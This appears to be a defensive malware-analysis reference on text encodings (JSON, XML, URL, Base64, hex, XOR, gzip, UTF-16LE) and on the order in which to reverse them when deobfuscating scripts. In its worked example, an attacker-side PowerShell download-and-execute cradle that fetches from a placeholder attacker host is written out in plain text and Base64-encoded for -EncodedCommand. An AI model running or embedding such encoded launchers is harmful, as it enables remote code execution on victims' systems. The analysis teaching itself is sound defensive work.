# 8.1.36 Text Encoding and Character Set Foundations

> **Core Principle**: Script hosts do not agree on how to interpret bytes. PowerShell's `-EncodedCommand` flag uses UTF-16LE. JSON-embedded scripts use UTF-8 with backslash escapes. EVTX records use XML with HTML entities. Base64 comes in three major variants that produce visually similar but incompatible output. These are not trivia — each encoding layer must be reversed in the correct order, with the correct tool, before the underlying script can be analyzed. Getting the order wrong produces output that looks plausible but isn't, which is worse than producing an obvious error.
>
> **Blue Team Impact**: The "Data Normalization" step in [4.3.00 §4 Step 2](../../04_Malware_Analysis_Cheatsheets/4.3_Script_Deobfuscation/4.3.00_Deobfuscation_Methodology.md) depends entirely on knowing which encoding the source medium uses. This document provides the systematic foundation: what each encoding does, how to recognize it, how to reverse it, and — most importantly — which **order** to apply reversals when multiple layers are present. Without this foundation, analysts spend time chasing "garbled output" symptoms that are actually encoding-layer confusion, not obfuscation.

---

## 1. The Three Encoding Layers

Every obfuscated script an analyst encounters has up to three encoding layers, applied in order from closest-to-source outward:

```
┌─────────────────────────────────────────┐
│ Layer 3: Transport / Source Medium      │  ← How did I get this blob?
│ (JSON escape, XML entity, URL encode,   │
│  EVTX XML)                              │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│ Layer 2: Payload Encoding               │  ← What encoding did the attacker apply?
│ (Base64, hex, UTF-16LE byte stream)     │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│ Layer 1: Character Representation       │  ← What character set is the script itself?
│ (UTF-8, UTF-16LE, ANSI codepage)        │
└─────────────────────────────────────────┘
```

**The critical rule**: Reversal happens from outside in. Transport encoding first, then payload encoding, then character-set interpretation. Reversing out of order produces garbled output that may look like a decoding failure but is actually the analyst applying the wrong tool to the wrong layer.

---

## 2. Layer 3: Transport / Source Medium Encoding

The outermost layer depends on where the analyst obtained the script. Different source media impose different escape conventions.

### 2.1 JSON String Escaping
A script appearing inside a JSON field (SIEM export, API response, configuration file) has its content escaped per JSON string rules:

- Backslash: `\\` → `\`
- Double quote: `\"` → `"`
- Newline: `\n` → actual newline
- Tab: `\t` → actual tab
- Unicode: `\u00XX` → the character with that code point

**Recognition**: Presence of `\"` or `\\` sequences in what appears to be script content. JSON-escaped PowerShell commands are extremely common in SIEM-exported events.

**Reversal**: Any JSON parser; CyberChef's "JSON_Unescape" operation; Python's `json.loads()` wrapping the string as a JSON string literal.

### 2.2 XML / HTML Entity Encoding
Scripts extracted from EVTX, XML exports, or HTML-wrapped documents have their content escaped per XML/HTML rules:

- `&lt;` → `<`
- `&gt;` → `>`
- `&amp;` → `&`
- `&quot;` → `"`
- `&apos;` → `'`
- `&#xNN;` or `&#NN;` → the character with that numeric code point

**Recognition**: `&amp;` is the telltale sign in EVTX-extracted PowerShell content. If an analyst runs a PowerShell script that contains `&amp;` and the interpreter says `'amp' is not recognized`, that's the signal — the script was pasted from EVTX without entity decoding.

**Reversal**: CyberChef's "From HTML Entity"; Python's `html.unescape()`; any XML parser.

### 2.3 URL / Percent Encoding
Scripts appearing in URLs, in HTTP POST bodies, or in web proxy logs are URL-encoded:

- `%20` → space
- `%22` → `"`
- `%3C` → `<`
- Any `%XX` where `XX` is the hex code point

**Recognition**: Presence of `%XX` hex sequences in what should be text. Common in exploit URLs, HTTP-delivered PowerShell stagers captured in proxy logs, and Server Error 500 responses.

**Reversal**: CyberChef's "URL Decode"; Python's `urllib.parse.unquote()`.

### 2.4 Double-Encoding
Attackers occasionally double-escape to defeat naive detection:

- URL-in-URL: `%2520` (literal `%20` after one decode, literal space after two)
- HTML-in-JSON: JSON contains `&amp;amp;` which decodes to `&amp;` which decodes to `&`

**Recognition**: After one pass of decoding, the output still contains encoding sequences. The fix is another decode pass in the same or a different layer.

**Practical guideline**: Decode iteratively. After each pass, inspect the output. If encoding sequences persist, decode again. Stop when the output is plain text.

## 3. Layer 2: Payload Encoding

After transport decoding, the content is the payload as the attacker packaged it. This layer typically uses one of a small number of encoding schemes.

### 3.1 Base64 and Its Variants

Base64 is the dominant payload encoding. Three variants exist, producing similar-looking but incompatible output:

| Variant | Alphabet | Padding | Common Use |
| :--- | :--- | :--- | :--- |
| **Standard** (RFC 4648) | `A-Z, a-z, 0-9, +, /` | `=` to pad to multiple of 4 | Default; PowerShell `-EncodedCommand`, most malware |
| **URL-safe** | `A-Z, a-z, 0-9, -, _` | `=` or omitted | JWT tokens, URL-embedded payloads |
| **No-padding** | Either alphabet | No `=` | Some custom encoders; may cause decoder errors if not handled |

**Recognition**:
- Length divisible by 4 (with or without padding) → likely standard Base64
- Contains `-` or `_` without `+` or `/` → URL-safe variant
- Contains `+` or `/` without padding → non-padded standard variant

**Reversal**: Base64 decoders generally accept all variants, but some strict implementations (notably PowerShell's `[Convert]::FromBase64String`) reject URL-safe without preprocessing. Python's `base64.b64decode()` with the `validate=False` flag handles most cases.

### 3.2 Hex Encoding
Raw hexadecimal representation of bytes: `48656c6c6f` → `Hello` (ASCII).

**Recognition**: Long strings of `[0-9a-fA-F]` characters, length divisible by 2, typical length > 40 characters for a meaningful payload.

**Variants**:
- **Lowercase vs uppercase**: both valid; most decoders accept either
- **With separators**: `\x48\x65\x6c\x6c\x6f`, `48 65 6c 6c 6f`, `48-65-6c-6c-6f` — different scripts use different separators
- **Byte-order variants**: some encoders emit in reverse order for obfuscation

**Reversal**: CyberChef "From Hex"; Python's `bytes.fromhex()` after stripping separators.

### 3.3 XOR and Simple Ciphers
Not strictly an "encoding" but frequently applied as a payload transformation layer:

- **Single-byte XOR**: Each byte XOR'd with a constant key
- **Multi-byte (repeating-key) XOR**: Each byte XOR'd with the corresponding position in a repeating key
- **Custom substitution**: Character-by-character replacement using a lookup table

**Recognition**: Content that appears binary-ish but has structural repetition (often visible in a hex dump). Base64-after-XOR is a common two-step obfuscation — the Base64 output looks like normal Base64, but decoded bytes are XOR-encrypted.

**Reversal**: Known-plaintext attack if any segment of expected plaintext is known (e.g., `MZ` at the start of an expected PE). Otherwise, tools like XORSearch can identify likely keys by looking for expected strings.

### 3.4 Compression as Encoding
Scripts may be compressed after encoding or before:

- **Gzip**: magic bytes `1F 8B`
- **Deflate** (raw): no magic bytes; harder to autodetect
- **PowerShell's Compress-Archive / `System.IO.Compression.GzipStream`**: standard gzip

**Recognition**: After Base64 decoding, the result has gzip magic bytes or is clearly non-text binary content.

**Reversal**: Any gzip/deflate decompressor; CyberChef's "Gunzip" or "Raw Inflate".

**Common chain**: `Base64(Gzip(UTF-16LE PowerShell source))` — three layers that must be reversed in order.

## 4. Layer 1: Character Representation

After transport and payload decoding, the final bytes must be interpreted as text. This requires knowing the character encoding.

### 4.1 UTF-8
The modern default. Variable-width encoding where ASCII characters are single bytes and non-ASCII characters are 2-4 bytes.

**Recognition**: Starts with ASCII-compatible bytes for English content; no byte-order issues; may have a Byte Order Mark (`EF BB BF`) at the start, though UTF-8 BOM is optional.

**Typical source**: Most web content, modern PowerShell 7+ scripts, most JSON, most Linux-originated content.

### 4.2 UTF-16LE (Little-Endian)
Microsoft's native Unicode encoding on Windows. Each character occupies 2 bytes minimum. ASCII characters appear as `XX 00` (letter byte followed by zero byte).

**Recognition**: Decoded binary content shows distinctive `XX 00 XX 00 XX 00` pattern for ASCII-heavy text. Starts with BOM `FF FE` if present.

**Typical source**: PowerShell's `-EncodedCommand` flag (the most important case for malware analysis), Windows clipboard, many Windows registry values.

**The PowerShell `-EncodedCommand` pitfall**: This is the single most common encoding mistake analysts make. PowerShell's `-EncodedCommand` expects UTF-16LE bytes, Base64-encoded. The correct decode chain is:

```
Base64 string → [Base64 decode] → UTF-16LE bytes → [UTF-16LE to text] → PowerShell source
```

Decoding as UTF-8 produces output where every other character is garbled or appears as null bytes — the characteristic symptom of an encoding mismatch.

**Verification in Python**:
```python
import base64
encoded_command = "SQBFAFgAIAAoAE4ARQB3AC0ATwBiAEoAZQBDAFQAIAAn..."
decoded_bytes = base64.b64decode(encoded_command)
script = decoded_bytes.decode('utf-16-le')  # NOT 'utf-8'
print(script)
```

**Verification in PowerShell**:
```powershell
$bytes = [System.Convert]::FromBase64String($encodedCommand)
[System.Text.Encoding]::Unicode.GetString($bytes)  # Unicode == UTF-16LE on Windows
```

### 4.3 UTF-16BE (Big-Endian)
Rare in Windows contexts but occasionally seen in older file formats or cross-platform exports. BOM `FE FF` at start. Bytes are swapped relative to LE: ASCII characters appear as `00 XX`.

**Typical source**: Some Unicode files from older systems or non-Windows platforms. Rarely relevant for malware analysis.

### 4.4 ANSI Codepages
Legacy Windows encoding that depends on the system locale:

- **Codepage 1252** (Windows-1252): Western European; the "default ANSI" on most English Windows systems
- **Codepage 932**: Japanese (Shift-JIS)
- **Codepage 936**: Simplified Chinese (GBK)
- **Codepage 949**: Korean
- Various others

**Recognition**: Bytes in the `80-FF` range that aren't valid UTF-8 multi-byte sequences and aren't UTF-16 patterns. Usually associated with legacy scripts or non-English malware.

**Reversal**: Decode with the appropriate codepage. `bytes.decode('cp1252')` in Python; `[System.Text.Encoding]::GetEncoding(1252).GetString($bytes)` in PowerShell.

### 4.5 Byte Order Marks (BOM) Reference
BOMs are optional markers at the start of a file indicating the encoding:

| BOM Bytes | Encoding |
| :--- | :--- |
| `EF BB BF` | UTF-8 |
| `FF FE` | UTF-16LE |
| `FE FF` | UTF-16BE |
| `FF FE 00 00` | UTF-32LE |
| `00 00 FE FF` | UTF-32BE |

BOMs are not required for any encoding but are frequently present in Windows-originated text files. Their absence is not informative (content may still be in any encoding); their presence is definitive.

## 5. The PowerShell `-EncodedCommand` Walkthrough

The most common multi-layer encoding an analyst encounters is PowerShell's `-EncodedCommand`. Walking through a complete example ties all three layers together.

### 5.1 The Attacker's Side

```powershell
# Starting PowerShell source
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload')"

# Encode for -EncodedCommand flag
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)  # UTF-16LE
$encoded = [Convert]::ToBase64String($bytes)                 # Base64
# Result: SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=

# Attacker launches
powershell.exe -EncodedCommand SQBFAFgAIAA...
```

### 5.2 The Analyst's Side

The analyst captures the full command line (from Event 4688, Sysmon EID 1, or EDR). The Base64 blob appears in the command line. To recover the original PowerShell:

**Step 1 — Transport decoding (if applicable)**:
If the command came from JSON-escaped SIEM output, unescape JSON first. If from EVTX XML, decode HTML entities first. Many times there is no transport layer and the Base64 is already clean.

**Step 2 — Base64 decoding**:
```python
import base64
blob = "SQBFAFgAIAAoAE4AZQB3AC0A..."
decoded_bytes = base64.b64decode(blob)
```

**Step 3 — Character encoding**:
```python
script = decoded_bytes.decode('utf-16-le')
print(script)
# Output: IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload')
```

### 5.3 What Goes Wrong

Analysts who apply UTF-8 decoding at Step 3 see garbled output with embedded null bytes or `?` characters — a characteristic "every other character is wrong" pattern. The instinct is to assume the Base64 was corrupted or the content is further encrypted. In reality, the encoding simply isn't UTF-8.

The symptom-to-cause mapping:

| Symptom | Likely Cause |
| :--- | :--- |
| Every other character is a null byte or `?` | UTF-16LE decoded as UTF-8 |
| Starts with `UEs` or `\xEF\xBB\xBF` | Decoded correctly, but content has BOM bytes |
| Output contains `&amp;` or `\"` | Transport decoding (XML or JSON) not applied |
| Output is binary-looking junk | Content is additionally gzipped or XOR'd |
| Output decodes fine but is half the expected length | Applied UTF-16 where content was actually UTF-8 |

### 5.4 CyberChef Recipe Equivalent

For analysts using CyberChef (offline desktop version preferred — see [4.3.00 §6.1](../../04_Malware_Analysis_Cheatsheets/4.3_Script_Deobfuscation/4.3.00_Deobfuscation_Methodology.md)):

```
From Base64 (A-Za-z0-9+/= alphabet, remove non-alphabet chars)
Decode text (UTF-16LE)
```

That's the complete recipe. If additional layers are present (gzip, XOR), add them between Base64 and UTF-16LE decoding.

## 6. Multi-Layer Reversal: The Order-of-Operations Principle

Real-world payloads frequently have multiple encoding layers stacked. The analyst must determine the order and reverse in the correct sequence.

### 6.1 The Stacking Convention
By convention, encoding is applied from inside out:
1. Start with source text
2. Encode as UTF-8 or UTF-16LE (Layer 1: character encoding)
3. Apply payload encoding (Layer 2: Base64, gzip, XOR)
4. Apply transport escape if the result will be embedded somewhere (Layer 3: JSON, XML, URL)

Reversal proceeds from outside in: transport first, then payload, then character.

### 6.2 Recognizing the Layers
At each step, inspect the output to determine the next layer:

- **Contains `\n`, `\"`, `\\`** → JSON layer remains, decode JSON
- **Contains `&amp;`, `&lt;`, `&gt;`** → XML/HTML layer remains, decode entities
- **Contains `%XX` sequences** → URL layer remains, URL-decode
- **Is a clean Base64-looking string (A-Z, a-z, 0-9, +, /, =)** → Base64 layer, decode
- **Has gzip magic bytes `1F 8B`** → Gzip layer, decompress
- **Shows `XX 00 XX 00` pattern** → UTF-16LE, decode
- **Looks like readable text** → Done

### 6.3 Practical Workflow
```
1. Copy payload to disposable file
2. If JSON/XML/URL escaping visible, decode that first
3. If Base64-looking, decode Base64
4. Inspect result: text? gzip? binary?
5. If gzip: decompress. If binary with pattern: try UTF-16LE. If text: you're done.
6. Repeat steps 2-5 as needed — multi-layer payloads may require several passes
```

### 6.4 When Order Gets Complex
Some payloads deliberately mix the layers to break automated tools:

- Base64-encoded UTF-8 JSON containing Base64-encoded UTF-16LE PowerShell
- URL-encoded hex-encoded gzipped UTF-8 script

The principle still applies: decode the outermost recognizable layer, inspect, repeat. Tools that try to auto-detect can mis-order layers; manual inspection between passes is more reliable.

## 7. Encoding Attacks and Edge Cases

Attackers occasionally use encoding itself as an obfuscation layer, exploiting ambiguity rather than just hiding content.

### 7.1 Encoding-Layer Variable Names
PowerShell accepts Unicode characters in variable names. An attacker can use visually-similar characters (homoglyphs) to create variable names that look identical to standard identifiers but aren't:

- Latin `a` (`U+0061`) vs Cyrillic `а` (`U+0430`) — visually identical, programmatically different
- Using these in variable names produces code that appears to reference a familiar variable but actually doesn't

**Detection**: String normalization (e.g., NFKC normalization) applied to script content before comparison. Most AMSI-era detection handles this automatically; pre-AMSI pattern matching may not.

### 7.2 The Null-Byte Termination Trick
Some older parsers terminate on null bytes. Embedding null bytes in strings can cause different tools to see different content:

- `malicious_function\x00benign_function` may be read as `malicious_function` by one tool and `benign_function` by another

This is rare in modern scripting contexts because the interpreters themselves handle it consistently, but it can affect static analysis tools.

### 7.3 Normalization Form Differences
Unicode supports multiple representations of the same logical character (e.g., `é` as one codepoint `U+00E9` or as `e` + combining acute accent `U+0065 U+0301`). Text that normalizes differently can evade naive string matching while appearing identical to humans.

**Detection**: Apply NFKC normalization to both source and comparison strings before matching.

## 8. Summary: The Six Structural Rules

For practical analysis work:

1. **Decode from outside in.** Transport encoding, then payload, then character.
2. **PowerShell `-EncodedCommand` is always UTF-16LE after Base64.** Never UTF-8.
3. **Every-other-character-is-null means UTF-16LE interpreted as UTF-8.** Re-decode with the correct encoding.
4. **If you see `&amp;`, `\"`, or `%XX` in "decoded" content, transport decoding is incomplete.** Apply another pass.
5. **Base64 alphabet tells you the variant.** `+`/`/` is standard; `-`/`_` is URL-safe.
6. **Offline CyberChef is the tool of choice for experimentation.** Online CyberChef leaks via URL fragments; never use for real investigation samples.

These rules cover the overwhelming majority of encoding scenarios in real incident response. Exotic cases (custom alphabets, non-standard encodings, homoglyph attacks) require deeper investigation but are rare enough that standard rules handle everyday work efficiently.
